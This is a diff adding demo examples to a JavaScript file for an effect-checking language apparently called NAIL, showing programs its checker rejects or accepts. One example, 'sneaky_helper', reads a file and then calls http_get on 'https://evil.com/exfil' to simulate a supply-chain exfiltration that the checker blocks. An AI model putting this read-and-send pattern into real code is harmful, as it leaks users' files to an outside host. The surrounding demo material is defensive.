@@ -694,6 +694,91 @@ const EXAMPLES = {
         }
       ]
     }
+  },
+
+  // ── Demo Suite examples ─────────────────────────────────────────────────
+
+  ai_review_effect_leak: {
+    label: "AI Review: Effect Leak",
+    group: "AI Review",
+    description: "AI left a debug print() inside a pure function. NAIL catches the IO effect leak — pure functions cannot perform IO. The checker rejects this before any code runs.",
+    args: {},
+    program: {
+      "nail": "0.4.0",
+      "kind": "fn",
+      "id": "double",
+      "effects": [],
+      "params": [{ "id": "x", "type": { "type": "int", "bits": 64, "overflow": "panic" } }],
+      "returns": { "type": "int", "bits": 64, "overflow": "panic" },
+      "body": [
+        { "op": "print", "val": { "ref": "x" }, "effect": "IO" },
+        { "op": "return", "val": { "op": "*", "l": { "ref": "x" }, "r": { "lit": 2 } } }
+      ]
+    }
+  },
+
+  ai_review_missing_branch: {
+    label: "AI Review: Missing Branch",
+    group: "AI Review",
+    description: "AI forgot the return in the else branch. Python would silently return None. NAIL requires all code paths to return a value matching the declared type.",
+    args: {},
+    program: {
+      "nail": "0.4.0",
+      "kind": "fn",
+      "id": "clamp_positive",
+      "effects": [],
+      "params": [{ "id": "x", "type": { "type": "int", "bits": 64, "overflow": "panic" } }],
+      "returns": { "type": "int", "bits": 64, "overflow": "panic" },
+      "body": [
+        {
+          "op": "if",
+          "cond": { "op": "gt", "l": { "ref": "x" }, "r": { "lit": 0 } },
+          "then": [{ "op": "return", "val": { "ref": "x" } }],
+          "else": []
+        }
+      ]
+    }
+  },
+
+  trust_effect_escalation: {
+    label: "Trust: Effect Escalation",
+    group: "Trust Boundary",
+    description: "A function declares only FS effects but tries to use http_get (NET). This simulates a supply-chain attack where a dependency secretly accesses the network. NAIL blocks the undeclared NET effect.",
+    args: {},
+    program: {
+      "nail": "0.4.0",
+      "kind": "fn",
+      "id": "sneaky_helper",
+      "effects": ["FS"],
+      "params": [{ "id": "path", "type": { "type": "string", "encoding": "utf8" } }],
+      "returns": { "type": "string", "encoding": "utf8" },
+      "body": [
+        { "op": "read_file", "path": { "ref": "path" }, "effect": "FS", "into": "data" },
+        { "op": "http_get", "url": { "lit": "https://evil.com/exfil" }, "effect": "NET", "into": "_resp" },
+        { "op": "return", "val": { "ref": "data" } }
+      ]
+    }
+  },
+
+  mcp_airgapped: {
+    label: "MCP: Air-Gapped Agent",
+    group: "MCP Firewall",
+    description: "An IO-only agent that can only print log messages. Demonstrates the 'air-gapped' policy from the MCP Firewall demo — no filesystem, no network, no process execution. This passes because the body only uses IO.",
+    args: {},
+    program: {
+      "nail": "0.4.0",
+      "kind": "fn",
+      "id": "log_only_agent",
+      "effects": ["IO"],
+      "params": [],
+      "returns": { "type": "unit" },
+      "body": [
+        { "op": "print", "val": { "lit": "Agent started (IO only — air-gapped mode)" }, "effect": "IO" },
+        { "op": "print", "val": { "lit": "Processing request... done." }, "effect": "IO" },
+        { "op": "print", "val": { "lit": "Agent finished. No files read, no network accessed." }, "effect": "IO" },
+        { "op": "return", "val": { "lit": null, "type": { "type": "unit" } } }
+      ]
+    }
   }
 };
 
